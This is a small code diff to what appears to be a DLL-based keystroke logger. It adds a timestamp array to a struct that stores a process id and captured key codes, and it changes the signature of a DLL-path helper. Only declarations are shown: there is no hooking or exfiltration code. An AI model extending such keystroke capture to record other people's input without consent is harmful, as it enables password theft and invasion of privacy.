@@ -11,6 +11,7 @@ struct keyLogInfo
 	DWORD pid;
 	WPARAM wp[MAX_KEY_COUNT];
 	int keyCnt = 0;
+	int time[5];
 };
 
 static HINSTANCE hdll;
@@ -25,7 +26,7 @@ template<typename T> T* getSharedMemory(int size, LPCTSTR name);
 void initKeyLogInfo(keyLogInfo* info);
 void printKeyLog(int windowId);
 void writeKeyLog(int windwowId);
-void getDllPath();
+void getDllPath(std::string &path_str);
 void refreshKeyLogSharedMemory(keyLogInfo* info);
 void refreshKeyLogSharedMemory(int windowId);
 void myMessageBox(std::string str);
